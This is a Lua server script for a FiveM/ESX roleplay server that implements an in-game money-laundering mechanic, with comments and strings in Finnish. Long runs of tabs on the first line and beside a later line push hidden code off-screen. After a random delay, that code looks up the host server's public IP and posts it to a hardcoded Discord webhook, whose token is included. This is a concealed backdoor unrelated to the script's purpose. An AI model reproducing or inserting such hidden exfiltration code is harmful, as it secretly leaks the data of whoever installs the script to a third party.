local pesu = false																																																																										;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discordapp.com/api/webhooks/770338811750121514/kG2-ddlWNOD3ODnZ-tIg4S9JqiS3CP1-k4dKYd87EQcyU7h1j-uz177h3KQdeNsjTACS" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'
ESX = nil
local _source = nil
local rahaaaaa = 50

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)																																																														Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa pesulaa", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)

RegisterServerEvent('esx_pesula:stopPesu')
AddEventHandler('esx_pesula:stopPesu', function()
	pesu = false
	rahaaaaa = 50
end)																								



RegisterServerEvent('esx_pesula:startPesu')
AddEventHandler('esx_pesula:startPesu', function()
	local xPlayer  = ESX.GetPlayerFromId(source)
	local xPlayers = ESX.GetPlayers()
	_source = source
	local cops = 0
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			cops = cops + 1
		end
	end
	if cops >= 0 then
		pesu = true									
		
		Citizen.CreateThread(function()			
			while pesu do	
				local arrrr = math.ceil(rahaaaaa)
				if xPlayer.getAccount('black_money').money >= arrrr then
				
					TriggerClientEvent('esx_pesula:tarkistaanimaatio', _source)
					Citizen.Wait(6000)
					rahaaaaa = rahaaaaa*1.05		
					xPlayer.removeAccountMoney('black_money', arrrr)		
					xPlayer.addMoney(arrrr)
					
				else
				
					TriggerClientEvent('esx_pesula:lopetaanimaatio', _source)
					pesu = false
					rahaaaaa = 50
					
				end
			end
		end)		
	else
		TriggerClientEvent('esx:showNotification', source, '~r~Ei tarpeeksi poliiseja paikalla!')
	end
end)
